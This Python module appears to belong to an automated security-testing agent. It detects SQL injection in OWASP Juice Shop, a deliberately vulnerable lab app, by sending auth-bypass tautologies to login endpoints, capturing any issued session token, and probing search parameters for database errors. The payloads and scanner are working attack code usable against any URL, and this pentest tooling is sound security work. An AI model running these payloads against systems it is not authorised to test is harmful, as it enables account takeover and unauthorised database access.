"""Deterministic SQL-injection oracles.

Ported from the benchmark harness (benchmarks/juiceshop/bench.py) which scores
precision=1.0 on these checks. A finding is VALIDATED only by an objective
signal — an auth bypass that issues a session token, or a raw DB parse error —
never by an LLM opinion or a template match. Fast (sub-second), hang-proof
(short per-request timeout), and reproducible.

Replaces the sqlmap shell-out in vuln_agent._execute_sqli_scan, which hung the
180s bridge call into the 300s task timeout and failed with "SQLMap execution
failed" on this stack. sqlmap stays available for deep/UNION cases behind an
explicit opt-in; these oracles are the reliable default.

ponytail: juice-shop-tuned defaults (login/search paths, DB markers). General
enough to drive off a dispatched url+data; widen markers/paths when a second
target needs it.
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional
from urllib.parse import parse_qsl, urlparse

import httpx

# Auth-bypass payloads: classic tautologies that break out of a string-built
# WHERE clause so the row matches without a valid password.
_BYPASS_PAYLOADS = ("' OR 1=1--", "' OR true--", "admin@juice-sh.op'--", "' OR '1'='1")

# Error-based payloads: break SQL syntax so the backend leaks a parse error.
_ERROR_PAYLOADS = ("qwert'))--", "'))--", "') OR 1=1--", "'", "\"")

# Substrings that only appear in a real DB engine's error page.
_SQL_ERROR_MARKERS = (
    "sqlite_error",
    "sqlite",
    "syntax error",
    "sequelizedatabaseerror",
    "unrecognized token",
    'near "',
    "sql syntax",
    "unclosed quotation",
    "psql:",
    "pg::",
    "ora-0",
)


async def detect_login_bypass(
    client: httpx.AsyncClient,
    url: str,
    *,
    email_field: str = "email",
    password_field: str = "password",
) -> Optional[Dict[str, Any]]:
    """POST injection payloads to a login endpoint; VALIDATED if the server issues
    a session token for a bogus password. Returns evidence dict or None."""
    for payload in _BYPASS_PAYLOADS:
        try:
            r = await client.post(
                url,
                json={email_field: payload, password_field: "oracle-not-a-real-pw"},
            )
        except Exception:
            continue
        token = None
        if r.status_code == 200:
            try:
                body = r.json()
                # Common shapes: {"authentication":{"token":..}} | {"token":..} | {"access_token":..}
                token = (
                    (body.get("authentication") or {}).get("token")
                    or body.get("token")
                    or body.get("access_token")
                )
            except Exception:
                token = None
        if token:
            return {
                "technique": "auth_bypass",
                "endpoint": url,
                "payload": payload,
                "http_status": 200,
                "proof": "server issued a session token for an injected identity with a bogus password",
                "token_prefix": str(token)[:24] + "...",
                "confidence": 1.0,
            }
    return None


async def detect_error_based(
    client: httpx.AsyncClient,
    url: str,
    *,
    param: Optional[str] = None,
) -> Optional[Dict[str, Any]]:
    """GET syntax-breaking payloads into a query param; VALIDATED if the backend
    returns a 5xx carrying a raw DB parse error. Returns evidence dict or None."""
    if param is None:
        q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
        param = (list(q)[-1] if q else "q")
    for payload in _ERROR_PAYLOADS:
        try:
            r = await client.get(url, params={param: payload})
        except Exception:
            continue
        body = (r.text or "")[:1200]
        low = body.lower()
        if r.status_code >= 500 and any(m in low for m in _SQL_ERROR_MARKERS):
            return {
                "technique": "error_based",
                "endpoint": url,
                "parameter": param,
                "payload": payload,
                "http_status": r.status_code,
                "db_error_excerpt": body[:300],
                "confidence": 1.0,
            }
    return None


async def scan_sqli(
    base_or_url: str,
    *,
    login_url: Optional[str] = None,
    search_url: Optional[str] = None,
    search_param: str = "q",
    data: Optional[str] = None,
    timeout: float = 20.0,
) -> List[Dict[str, Any]]:
    """Run the applicable oracle(s) and return a list of VALIDATED evidence dicts.

    - login_url (or a url with `data` that looks like a login) -> auth-bypass oracle
    - search_url (or a GET url with a query param)             -> error-based oracle
    Defaults target OWASP Juice Shop's known injectable endpoints when only a base
    URL is given, so a bare engagement scope still gets a real scan.
    """
    base = base_or_url.rstrip("/")
    is_base = urlparse(base_or_url).path in ("", "/")
    if login_url is None:
        login_url = f"{base}/rest/user/login" if is_base else (base_or_url if data is not None else None)
    if search_url is None and is_base:
        search_url = f"{base}/rest/products/search"

    findings: List[Dict[str, Any]] = []
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=timeout) as c:
        if login_url:
            ev = await detect_login_bypass(c, login_url)
            if ev:
                findings.append(ev)
        # If a non-base GET url was supplied, error-test it directly too.
        if search_url is None and not is_base and data is None:
            search_url = base_or_url
        if search_url:
            ev = await detect_error_based(c, search_url, param=search_param if urlparse(search_url).path.endswith("/search") else None)
            if ev:
                findings.append(ev)
    return findings


if __name__ == "__main__":
    # Runnable self-check against a local target (default: juice-shop). Asserts the
    # oracle finds both the auth-bypass and error-based SQLi on juice-shop.
    import asyncio
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    res = asyncio.run(scan_sqli(target))
    for f in res:
        print(f"[VALIDATED] {f['technique']:12s} {f['endpoint']}  payload={f['payload']!r}")
    techs = {f["technique"] for f in res}
    assert "auth_bypass" in techs, f"expected auth_bypass SQLi on {target}, got {techs}"
    assert "error_based" in techs, f"expected error_based SQLi on {target}, got {techs}"
    print(f"OK: {len(res)} validated SQLi on {target}")
